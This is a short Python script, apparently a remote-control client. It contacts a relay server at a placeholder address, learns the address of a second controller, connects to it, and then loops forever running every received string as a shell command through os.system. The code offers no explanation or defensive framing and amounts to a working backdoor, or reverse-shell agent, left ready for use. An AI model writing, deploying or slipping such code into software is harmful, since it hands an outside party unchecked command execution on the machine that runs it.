import os
import socket

m_ip = "ENTER YOUR MAIN SERVER IP!"
m_port = 0 #ENTER MAIN SERVER PORT!

r_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
r_client.connect((m_ip, m_port))
data = bytes("client", "ascii") + bytes(10)
r_client.send(data)

conn_d = r_client.recv(8)

if (conn_d[6] != 0xFF and conn_d[7] == 0xFF):
    print("[-] Failed establishing connection.")
    r_client.close()
    exit()

s_addr = socket.inet_ntoa((conn_d[:4])[::-1])
s_port = int.from_bytes(conn_d[4:6], 'little')

print(f"[+] Connecting to {s_addr}:{s_port}...")

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.connect((s_addr, s_port))

print("[+] Connected!")
while True:
    d = server.recv(256)
    os.system(d.decode('ascii'))

    server.send(bytes("100", 'ascii'))
